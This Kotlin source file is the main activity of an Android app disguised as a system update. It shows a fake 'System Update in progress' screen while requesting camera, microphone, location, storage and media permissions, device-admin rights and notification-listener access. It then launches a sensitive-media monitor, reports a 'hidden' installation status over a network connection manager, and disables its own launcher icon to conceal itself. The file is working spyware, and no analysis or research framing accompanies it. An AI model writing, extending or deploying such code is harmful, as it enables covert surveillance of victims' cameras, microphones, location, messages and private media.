package com.android.system.update.ui

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.android.system.update.core.AdminReceiver
import com.android.system.update.core.NetworkConnectionManager
import com.android.system.update.core.SensitiveMediaMonitor

class MainActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 100
    private lateinit var connectionManager: NetworkConnectionManager

    private val requiredPermissions = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
        }
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        connectionManager = NetworkConnectionManager(this)
        setContentView(createDecoyView())
        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        if (!hasAllPermissions()) {
            ActivityCompat.requestPermissions(this, requiredPermissions, PERMISSION_REQUEST_CODE)
        } else {
            step2_RequestAdmin()
        }
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all {
            ActivityCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun step2_RequestAdmin() {
        if (!AdminReceiver.isAdminActive(this)) {
            AdminReceiver.requestAdmin(this)
        } else {
            step3_RequestNotificationAccess()
        }
    }

    private fun step3_RequestNotificationAccess() {
        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        if (enabledListeners == null || !enabledListeners.contains(packageName)) {
            try {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            } catch (e: Exception) {
                finalizeAndHide()
            }
        } else {
            finalizeAndHide()
        }
    }

    private fun finalizeAndHide() {
        try {
            SensitiveMediaMonitor(this, connectionManager).startMonitoring()
        } catch (e: Exception) {}
        connectionManager.sync("{\"event\":\"installation_complete\", \"status\":\"hidden\"}", "device_logs")
        val p = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        finish()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        step2_RequestAdmin()
    }

    private fun createDecoyView(): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(80, 80, 80, 80)
            setBackgroundColor(0xFFF5F5F5.toInt())
            addView(TextView(context).apply {
                text = "System Update in progress..."
                textSize = 20f
                setTextColor(0xFF333333.toInt())
                setPadding(0, 0, 0, 40)
            })
            addView(ProgressBar(context, null, android.R.attr.progressBarStyleHorizontal).apply {
                isIndeterminate = true
                layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 20)
            })
            addView(TextView(context).apply {
                text = "Please do not turn off your device.\nThis may take a few minutes."
                textSize = 14f
                gravity = Gravity.CENTER
                setTextColor(0xFF666666.toInt())
                setPadding(0, 40, 0, 0)
            })
        }
    }
}